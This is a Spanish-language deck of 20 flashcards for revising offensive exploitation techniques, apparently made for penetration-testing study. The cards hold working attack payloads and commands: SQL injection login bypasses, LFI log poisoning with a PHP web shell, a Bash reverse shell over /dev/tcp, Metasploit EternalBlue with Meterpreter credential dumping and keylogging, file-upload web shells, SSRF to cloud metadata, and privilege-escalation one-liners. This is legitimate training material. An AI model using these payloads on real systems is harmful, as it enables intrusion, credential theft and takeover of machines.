---
title: "Flashcards - Tecnicas de Explotacion"
tags:
  - hacking
  - ofensivo
  - explotacion
  - flashcards
  - repaso
tipo: flashcards
certificacion: hacking-vault
subtema: "explotacion"
---

# Flashcards: Tecnicas de Explotacion

> 20 tarjetas de repaso. Usa el sistema de repeticion espaciada para memorizar.

<div class="flashcard-deck" data-subtema="explotacion">
</div>

<div class="flashcard" data-id="expl-fc-001">
<div class="flashcard-front">

**P:** Que payload de SQL injection usarias para hacer bypass de autenticacion en un formulario de login?

</div>
<div class="flashcard-back">

**R:** `' OR '1'='1' --` o `admin' --`. El primer payload hace que la condicion WHERE siempre sea verdadera. El segundo cierra la comilla del campo usuario y comenta el resto de la consulta (incluyendo la verificacion de password). Variantes: `' OR '1'='1' #` (MySQL) y `" OR "1"="1" --`.

</div>
</div>

---

<div class="flashcard-deck" data-subtema="explotacion">
</div>

<div class="flashcard" data-id="expl-fc-002">
<div class="flashcard-front">

**P:** Como determinarias el numero de columnas en una inyeccion SQL Union-based?

</div>
<div class="flashcard-back">

**R:** Usar `ORDER BY` incrementando el numero hasta obtener error: `' ORDER BY 1-- -`, `' ORDER BY 2-- -`, `' ORDER BY 3-- -`. Cuando da error, el numero anterior es la cantidad de columnas. Luego construir el UNION: `' UNION SELECT 1,2,3-- -` para identificar que columnas se reflejan en la respuesta.

</div>
</div>

---

<div class="flashcard-deck" data-subtema="explotacion">
</div>

<div class="flashcard" data-id="expl-fc-003">
<div class="flashcard-front">

**P:** Que comando de sqlmap usarias para volcar los datos de una tabla especifica de una base de datos?

</div>
<div class="flashcard-back">

**R:** `sqlmap -u "http://10.10.10.1/page?id=1" -D basedatos -T usuarios --dump`. El flujo completo es: `--dbs` (listar bases de datos), `-D basedatos --tables` (listar tablas), `-D basedatos -T tabla --dump` (volcar datos). Para obtener una shell del SO: `--os-shell`.

</div>
</div>

---

<div class="flashcard-deck" data-subtema="explotacion">
</div>

<div class="flashcard" data-id="expl-fc-004">
<div class="flashcard-front">

**P:** Cual es la diferencia entre XSS Reflejado, Almacenado y DOM-based?

</div>
<div class="flashcard-back">

**R:** **Reflejado**: el payload se envia en la URL/request y se refleja en la respuesta inmediata, afecta solo al usuario que abre el enlace. **Almacenado**: el payload se guarda en la base de datos y se ejecuta para todos los usuarios que visiten la pagina. **DOM-based**: el payload manipula el DOM en el navegador sin pasar por el servidor, via JavaScript del cliente.

</div>
</div>

---

<div class="flashcard-deck" data-subtema="explotacion">
</div>

<div class="flashcard" data-id="expl-fc-005">
<div class="flashcard-front">

**P:** Que wrapper de PHP usarias para leer el codigo fuente de un archivo PHP a traves de un LFI?

</div>
<div class="flashcard-back">

**R:** `php://filter/convert.base64-encode/resource=config.php`. Este wrapper codifica el contenido en Base64 antes de mostrarlo, evitando que PHP lo ejecute. La URL completa seria: `http://objetivo/page?file=php://filter/convert.base64-encode/resource=config.php`. Luego decodificar con `echo "base64_string" | base64 -d`.

</div>
</div>

---

<div class="flashcard-deck" data-subtema="explotacion">
</div>

<div class="flashcard" data-id="expl-fc-006">
<div class="flashcard-front">

**P:** Que tecnica permite convertir un LFI en ejecucion remota de codigo (RCE) usando logs de Apache?

</div>
<div class="flashcard-back">

**R:** **Log Poisoning**. Paso 1: Inyectar codigo PHP en el User-Agent: `curl -A "<?php system(\$_GET['cmd']); ?>" http://objetivo/`. Paso 2: Incluir el log de Apache via LFI: `http://objetivo/page?file=/var/log/apache2/access.log&cmd=id`. El servidor interpreta el PHP inyectado en el log al incluirlo.

</div>
</div>

---

<div class="flashcard-deck" data-subtema="explotacion">
</div>

<div class="flashcard" data-id="expl-fc-007">
<div class="flashcard-front">

**P:** Que operadores de inyeccion de comandos (Command Injection) conoces y cual es el mas comun?

</div>
<div class="flashcard-back">

**R:** `;` (secuencial), `|` (pipe), `||` (OR logico), `&` (background), `&&` (AND logico), `$(cmd)` (sustitucion de comando), `` `cmd` `` (backticks). El mas comun es `;` que ejecuta el segundo comando independientemente del resultado del primero. Para bypass de filtros de espacios: `cat${IFS}/etc/passwd` o `{cat,/etc/passwd}`.

</div>
</div>

---

<div class="flashcard-deck" data-subtema="explotacion">
</div>

<div class="flashcard" data-id="expl-fc-008">
<div class="flashcard-front">

**P:** Como se usa Metasploit para explotar la vulnerabilidad EternalBlue (MS17-010)?

</div>
<div class="flashcard-back">

**R:** 1) `use exploit/windows/smb/ms17_010_eternalblue`, 2) `set RHOSTS 10.10.10.1` (objetivo), 3) `set LHOST 10.10.14.5` (atacante), 4) `set PAYLOAD windows/x64/meterpreter/reverse_tcp`, 5) `exploit`. Para buscar exploits: `search eternalblue` o `search cve:2021-44228`. Gestionar sesiones con `sessions -l` (listar) y `sessions -i 1` (interactuar).

</div>
</div>

---

<div class="flashcard-deck" data-subtema="explotacion">
</div>

<div class="flashcard" data-id="expl-fc-009">
<div class="flashcard-front">

**P:** Que comandos de Meterpreter usarias para recopilar credenciales despues de obtener acceso?

</div>
<div class="flashcard-back">

**R:** `hashdump` (volcar hashes SAM de Windows), `getsystem` (elevar a SYSTEM), `keyscan_start` y `keyscan_dump` (keylogger), `screenshot` (captura de pantalla). Para navegacion: `download archivo.txt`, `upload shell.exe`. Para migrar a otro proceso (evasion): `migrate PID`.

</div>
</div>

---

<div class="flashcard-deck" data-subtema="explotacion">
</div>

<div class="flashcard" data-id="expl-fc-010">
<div class="flashcard-front">

**P:** Que herramienta usarias para buscar exploits publicos localmente y como copiarias uno al directorio actual?

</div>
<div class="flashcard-back">

**R:** **searchsploit** (interfaz local de ExploitDB). Buscar: `searchsploit apache 2.4` o `searchsploit --cve 2021-44228`. Examinar exploit: `searchsploit -x 12345.py`. Copiar al directorio actual: `searchsploit -m 12345.py`. Actualizar la base de datos: `searchsploit -u`.

</div>
</div>

---

<div class="flashcard-deck" data-subtema="explotacion">
</div>

<div class="flashcard" data-id="expl-fc-011">
<div class="flashcard-front">

**P:** Que es Hydra y como lo usarias para hacer fuerza bruta de un formulario HTTP POST?

</div>
<div class="flashcard-back">

**R:** Hydra es una herramienta de fuerza bruta de autenticacion multiprotocolo. Para HTTP POST: `hydra -l admin -P rockyou.txt 10.10.10.1 http-post-form "/login:user=^USER^&pass=^PASS^:F=Login failed"`. `^USER^` y `^PASS^` son placeholders, y `F=` define el texto de fallo. Soporta SSH, FTP, SMB, RDP y mas.

</div>
</div>

---

<div class="flashcard-deck" data-subtema="explotacion">
</div>

<div class="flashcard" data-id="expl-fc-012">
<div class="flashcard-front">

**P:** Cual es la diferencia entre John the Ripper y Hashcat para crackeo de contrasenas?

</div>
<div class="flashcard-back">

**R:** **John the Ripper** funciona principalmente en CPU, detecta automaticamente formatos de hash, y tiene utilidades como `zip2john`, `ssh2john` para extraer hashes de archivos protegidos. **Hashcat** aprovecha la GPU para mayor velocidad, requiere especificar el modo de hash con `-m` (ej: `-m 0` MD5, `-m 1000` NTLM) y soporta ataques de mascara (`-a 3`) y reglas avanzadas.

</div>
</div>

---

<div class="flashcard-deck" data-subtema="explotacion">
</div>

<div class="flashcard" data-id="expl-fc-013">
<div class="flashcard-front">

**P:** Escribe una reverse shell en Bash y explica como estabilizarla.

</div>
<div class="flashcard-back">

**R:** Reverse shell: `bash -i >& /dev/tcp/10.10.14.5/4444 0>&1`. Estabilizar: 1) `python3 -c 'import pty; pty.spawn("/bin/bash")'`, 2) Ctrl+Z para background, 3) `stty raw -echo; fg`, 4) `export TERM=xterm`, 5) `stty rows 40 cols 120`. El listener se abre con `nc -lvnp 4444` o `rlwrap nc -lvnp 4444` para mejor interaccion.

</div>
</div>

---

<div class="flashcard-deck" data-subtema="explotacion">
</div>

<div class="flashcard" data-id="expl-fc-014">
<div class="flashcard-front">

**P:** Cual es la diferencia entre una bind shell y una reverse shell, y cuando usarias cada una?

</div>
<div class="flashcard-back">

**R:** **Bind shell**: el objetivo abre un puerto y espera conexion del atacante. El firewall suele bloquearla (puerto entrante). **Reverse shell**: el objetivo se conecta al atacante. Funciona mejor porque las conexiones salientes rara vez se filtran. Se usa reverse shell en la mayoria de pentests; bind shell solo en redes internas sin filtrado.

</div>
</div>

---

<div class="flashcard-deck" data-subtema="explotacion">
</div>

<div class="flashcard" data-id="expl-fc-015">
<div class="flashcard-front">

**P:** Que comando de Linux usarias para buscar archivos con el bit SUID activado y por que son un vector de escalada de privilegios?

</div>
<div class="flashcard-back">

**R:** `find / -perm -4000 -type f 2>/dev/null`. Los archivos SUID se ejecutan con los privilegios del propietario (normalmente root). Si un binario SUID tiene una vulnerabilidad o puede ejecutar comandos, permite escalar privilegios. Consultar GTFOBins (https://gtfobins.github.io) para tecnicas de explotacion por binario.

</div>
</div>

---

<div class="flashcard-deck" data-subtema="explotacion">
</div>

<div class="flashcard" data-id="expl-fc-016">
<div class="flashcard-front">

**P:** Que es SSRF (Server-Side Request Forgery) y que URL usarias para acceder a metadatos de AWS desde un SSRF?

</div>
<div class="flashcard-back">

**R:** SSRF permite hacer que el servidor realice peticiones HTTP a destinos internos o externos en nombre del atacante. Para metadatos AWS: `http://169.254.169.254/latest/meta-data/`. Esto expone credenciales IAM, configuracion de la instancia y tokens de sesion. Bypasses de filtros: IP en hexadecimal (`0x7f000001`), decimal (`2130706433`) o IPv6 (`[::1]`).

</div>
</div>

---

<div class="flashcard-deck" data-subtema="explotacion">
</div>

<div class="flashcard" data-id="expl-fc-017">
<div class="flashcard-front">

**P:** Que tecnicas de bypass de file upload conoces para subir una web shell PHP?

</div>
<div class="flashcard-back">

**R:** Doble extension (`shell.php.jpg`), null byte (`shell.php%00.jpg`), cambiar Content-Type a `image/jpeg`, agregar magic bytes de imagen (`GIF89a;<?php system($_GET['cmd']); ?>`), extensiones alternativas de PHP (`shell.phtml`, `shell.php3`, `shell.php5`, `shell.phar`). Combinar varias tecnicas aumenta las posibilidades de exito.

</div>
</div>

---

<div class="flashcard-deck" data-subtema="explotacion">
</div>

<div class="flashcard" data-id="expl-fc-018">
<div class="flashcard-front">

**P:** Que es un buffer overflow y cuales son los pasos basicos para explotarlo?

</div>
<div class="flashcard-back">

**R:** Un buffer overflow ocurre cuando se escriben mas datos de los que caben en un buffer, sobreescribiendo el return address (EIP/RIP). Pasos: 1) Encontrar el offset exacto con `msf-pattern_create`, 2) Sobreescribir EIP con la direccion de un `JMP ESP`, 3) Colocar un NOP sled (`\x90`) seguido del shellcode. Generar shellcode con `msfvenom -p linux/x86/shell_reverse_tcp LHOST=IP LPORT=4444 -b '\x00' -f python`.

</div>
</div>

---

<div class="flashcard-deck" data-subtema="explotacion">
</div>

<div class="flashcard" data-id="expl-fc-019">
<div class="flashcard-front">

**P:** Como usarias `sudo -l` y GTFOBins para escalar privilegios en Linux?

</div>
<div class="flashcard-back">

**R:** `sudo -l` muestra que comandos puede ejecutar el usuario con sudo. Si aparece un binario como vim, python3, awk o find, consultar GTFOBins para la tecnica de escalada. Ejemplos: `sudo vim -c ':!/bin/bash'`, `sudo python3 -c 'import os; os.system("/bin/bash")'`, `sudo awk 'BEGIN {system("/bin/bash")}'`.

</div>
</div>

---

<div class="flashcard-deck" data-subtema="explotacion">
</div>

<div class="flashcard" data-id="expl-fc-020">
<div class="flashcard-front">

**P:** Que es una inyeccion SQL ciega (Blind SQLi) y cuales son sus dos tipos?

</div>
<div class="flashcard-back">

**R:** La SQLi ciega no muestra datos directamente en la respuesta. **Boolean-based**: se infiere informacion por diferencias en la respuesta (verdadero/falso). Ejemplo: `' AND SUBSTRING(username,1,1)='a'-- -`. **Time-based**: se usa el tiempo de respuesta. Ejemplo: `' AND IF(1=1,SLEEP(5),0)-- -`. Si la respuesta tarda 5 segundos, la condicion es verdadera.

</div>
</div>

---
